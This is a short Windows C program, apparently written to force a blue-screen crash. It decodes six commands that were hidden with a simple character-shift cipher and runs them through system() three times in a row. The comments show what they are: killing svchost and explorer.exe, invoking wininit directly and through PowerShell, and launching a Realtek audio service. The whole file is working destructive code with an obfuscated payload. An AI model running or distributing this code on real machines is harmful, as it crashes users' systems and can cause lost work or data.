#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void decrypt(char *text, int shift)
{
    int length = strlen(text);
    for (int i = 0; i < length; i++)
    {
        text[i] = (char)((int)text[i] - shift);
    }
}


void trybsod()
{
    char text_1[] = "vcummknn\"1ko\"uxejquv\"1h";
    char text_2[] = "vcummknn\"1ko\"uxejquv0gzg\"1h";
    char text_3[] = "vcummknn\"1ko\"gzrnqtgt0gzg\"1h";
    char text_4[] = "ykpkpkv";
    char text_5[] = "rqygtujgnn0gzg\"/Eqoocpf\"^$ykpkpkv^$";
    char text_6[] = "uvctv\"TvmCwfWUgtxkeg860gzg";

    decrypt(text_1, 2);
    decrypt(text_2, 2);
    decrypt(text_3, 2);
    decrypt(text_4, 2);
    decrypt(text_5, 2);
    decrypt(text_6, 2);


    system(text_1);
    //1 taskkill /im svchost /f
    system(text_2);
    //2 taskkill /im svchost.exe /f

    system(text_3);
    //3 taskkill /im explorer.exe /f

    system(text_4);
    //4 wininit
    system(text_5);
    //5 powershell.exe -Command \"wininit\"

    system(text_6);
    //6 start RtkAudUService64.exe
}


int main()
{
    Sleep(3000);

    for (int i = 0; i < 3; i++)
    {
        trybsod();

        Sleep(1000);
    }

    
        
    return 0;
}